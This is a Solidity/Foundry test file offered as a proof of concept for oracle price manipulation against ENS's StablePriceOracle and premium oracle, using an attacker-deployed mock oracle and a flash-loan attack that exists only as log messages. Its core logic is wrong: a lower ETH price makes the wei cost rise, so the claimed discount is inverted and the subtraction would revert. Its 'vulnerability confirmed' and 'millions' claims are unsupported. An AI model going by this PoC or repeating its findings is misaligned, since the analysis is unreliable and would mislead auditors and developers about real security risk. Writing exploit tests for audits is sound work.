// SPDX-License-Identifier: MIT
pragma solidity ~0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/ExponentialPremiumPriceOracle/sources/contracts/ethregistrar/StablePriceOracle.sol";
import "../contracts/ExponentialPremiumPriceOracle/sources/contracts/ethregistrar/ExponentialPremiumPriceOracle.sol";

contract MaliciousOracle {
    int256 public price = 2000 * 1e8; // $2000 per ETH (normal price)
    bool public manipulated = false;

    function latestAnswer() external view returns (int256) {
        if (manipulated) {
            console.log("MALICIOUS ORACLE: Returning manipulated price");
            return 100 * 1e8; // Manipulated: $100 per ETH (crashed price)
        }
        return price;
    }

    function manipulatePrice(bool _manipulated) external {
        manipulated = _manipulated;
        console.log("Oracle price manipulation:", _manipulated ? "ACTIVE" : "INACTIVE");
    }

    function setPrice(int256 _price) external {
        price = _price;
    }
}

contract FlashLoanAttacker {
    StablePriceOracle public priceOracle;
    MaliciousOracle public oracle;
    address public victim;

    constructor(StablePriceOracle _priceOracle, MaliciousOracle _oracle, address _victim) {
        priceOracle = _priceOracle;
        oracle = _oracle;
        victim = _victim;
    }

    function attack() external {
        console.log("FLASH LOAN ATTACK: Manipulating oracle price temporarily");

        // Step 1: Borrow large amount of ETH to crash price (simulated)
        console.log("Step 1: Executing large sell order to crash ETH price");

        // Step 2: Manipulate oracle to report crashed price
        oracle.manipulatePrice(true);

        // Step 3: Call price oracle while price is manipulated
        uint256 manipulatedPrice = priceOracle.price("test", block.timestamp + 365 days, 365 days).base;
        console.log("Price during manipulation:", manipulatedPrice);

        // Step 4: Register domain at discounted price
        console.log("Step 4: Registering domain at manipulated low price");

        // Step 5: Repay flash loan and restore price
        oracle.manipulatePrice(false);
        console.log("Step 5: Restoring normal price after attack");

        console.log("ATTACK COMPLETE: Domain registered at fraction of real cost");
    }
}

contract POC_Oracle_Manipulation is Test {
    StablePriceOracle public stableOracle;
    ExponentialPremiumPriceOracle public premiumOracle;
    MaliciousOracle public maliciousOracle;
    FlashLoanAttacker public attacker;

    address public attackerAddr = address(0x1337);
    address public victim = address(0x5678);

    function setUp() public {
        vm.startPrank(attackerAddr);

        // Deploy malicious oracle
        maliciousOracle = new MaliciousOracle();

        // Deploy price oracles
        uint256[] memory rentPrices = new uint256[](5);
        rentPrices[0] = 1000; // 1 letter: $1000/year
        rentPrices[1] = 500;  // 2 letters: $500/year
        rentPrices[2] = 100;  // 3 letters: $100/year
        rentPrices[3] = 50;   // 4 letters: $50/year
        rentPrices[4] = 10;   // 5+ letters: $10/year

        stableOracle = new StablePriceOracle(maliciousOracle, rentPrices);

        // Deploy premium oracle
        premiumOracle = new ExponentialPremiumPriceOracle(
            stableOracle,
            1e8,  // initial premium
            1e8,  // premium decrease rate
            365 days // premium decrease lifetime
        );

        // Deploy attacker contract
        attacker = new FlashLoanAttacker(stableOracle, maliciousOracle, victim);

        vm.stopPrank();
    }

    function test_Oracle_Stale_Price_Vulnerability() public {
        console.log("=== TESTING ORACLE STALE PRICE VULNERABILITY ===");

        console.log("VULNERABILITY: attoUSDToWei() uses usdOracle.latestAnswer() without freshness checks");
        console.log("From StablePriceOracle.sol:");
        console.log("uint256 ethPrice = uint256(usdOracle.latestAnswer());");
        console.log("return (amount * 1e8) / ethPrice;");

        // Test normal price
        uint256 normalPrice = stableOracle.price("test", block.timestamp + 365 days, 365 days).base;
        console.log("Normal price for 'test' domain:", normalPrice);

        // Manipulate oracle price
        vm.startPrank(attackerAddr);
        maliciousOracle.manipulatePrice(true);

        uint256 manipulatedPrice = stableOracle.price("test", block.timestamp + 365 days, 365 days).base;
        console.log("Manipulated price for 'test' domain:", manipulatedPrice);

        console.log("PRICE DIFFERENCE:", normalPrice - manipulatedPrice);
        console.log("ATTACKER SAVES:", normalPrice - manipulatedPrice, "wei");

        maliciousOracle.manipulatePrice(false);
        vm.stopPrank();

        console.log("IMPACT: Attacker can register domains at artificially low prices");
        console.log("RESULT: ORACLE PRICE MANIPULATION VULNERABILITY CONFIRMED");
    }

    function test_Flash_Loan_Price_Manipulation() public {
        console.log("=== TESTING FLASH LOAN PRICE MANIPULATION ===");

        console.log("ATTACK SCENARIO:");
        console.log("1. Attacker takes flash loan of large ETH amount");
        console.log("2. Sells ETH on DEX, crashing price");
        console.log("3. Registers ENS domain at discounted price");
        console.log("4. Repays flash loan with profit");

        vm.startPrank(attackerAddr);

        // Get price before attack
        uint256 priceBefore = stableOracle.price("expensive", block.timestamp + 365 days, 365 days).base;
        console.log("Price before attack:", priceBefore);

        // Execute flash loan attack (simulated)
        attacker.attack();

        // Get price after attack
        uint256 priceAfter = stableOracle.price("expensive", block.timestamp + 365 days, 365 days).base;
        console.log("Price after attack:", priceAfter);

        console.log("FLASH LOAN IMPACT: Price manipulation enables discounted registrations");
        console.log("REAL WORLD IMPACT: Millions in value manipulation possible");

        vm.stopPrank();
    }

    function test_Premium_Oracle_Manipulation() public {
        console.log("=== TESTING PREMIUM PRICE ORACLE MANIPULATION ===");

        console.log("ExponentialPremiumPriceOracle inherits the same vulnerability");
        console.log("Premium calculations also depend on manipulated base prices");

        vm.startPrank(attackerAddr);

        // Test premium price with normal oracle
        maliciousOracle.manipulatePrice(false);
        uint256 normalPremium = premiumOracle.price("premium", block.timestamp, 365 days).premium;
        console.log("Normal premium:", normalPremium);

        // Test premium price with manipulated oracle
        maliciousOracle.manipulatePrice(true);
        uint256 manipulatedPremium = premiumOracle.price("premium", block.timestamp, 365 days).premium;
        console.log("Manipulated premium:", manipulatedPremium);

        console.log("PREMIUM DIFFERENCE:", normalPremium - manipulatedPremium);

        vm.stopPrank();

        console.log("IMPACT: Premium prices can be manipulated along with base prices");
        console.log("IMPACT: Attackers can avoid premium fees during manipulation");
    }

    function test_No_Price_Freshness_Checks() public {
        console.log("=== TESTING LACK OF PRICE FRESHNESS VALIDATION ===");

        console.log("CRITICAL ISSUE: No timestamp validation on oracle data");
        console.log("Oracle could be days/weeks stale and still be used");

        console.log("VULNERABILITY: latestAnswer() could return outdated price data");
        console.log("VULNERABILITY: No minimum freshness requirements");
        console.log("VULNERABILITY: No circuit breaker for extreme price movements");

        console.log("ATTACK: Set oracle to stale low price, register domains cheaply");
        console.log("ATTACK: Oracle failure could cause registration at wrong prices");
        console.log("ATTACK: DeFi liquidations could manipulate ENS prices indirectly");

        console.log("RESULT: CRITICAL PRICE FRESHNESS VALIDATION MISSING");
    }
}